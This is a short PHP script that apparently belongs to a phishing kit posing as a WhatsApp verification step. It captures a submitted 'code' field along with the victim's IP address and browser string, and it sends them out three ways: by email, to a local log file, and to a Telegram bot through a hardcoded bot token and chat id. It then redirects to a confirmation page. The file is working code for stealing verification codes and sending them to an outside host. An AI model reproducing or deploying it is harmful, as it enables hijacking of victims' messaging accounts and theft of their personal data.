<?php
$IP = getenv("REMOTE_ADDR");
$message .= "--++---[code ]--++--\n";
$message .= "----- th3 -----\n";
$message .= "code : ".$_POST['code']."\n";
$message .= "---- IP Infos ---\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$sender = "whatsapp code";
$subject = "sa Post [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
mail($email,$subject,$message);
    $text = fopen('../oomar.txt', 'a');
fwrite($text, $message);

$token = "5281489010:AAGXEGe-0xkBJfnC_VI7EDyyc2ReuTcf1fA";
$data = [
    'text' => $message,
    'chat_id' => '-1001597781519'
];

file_get_contents("https://api.telegram.org/bot5281489010:AAGXEGe-0xkBJfnC_VI7EDyyc2ReuTcf1fA/sendMessage?" . http_build_query($data) );

header("Location: confimation2.php");
?>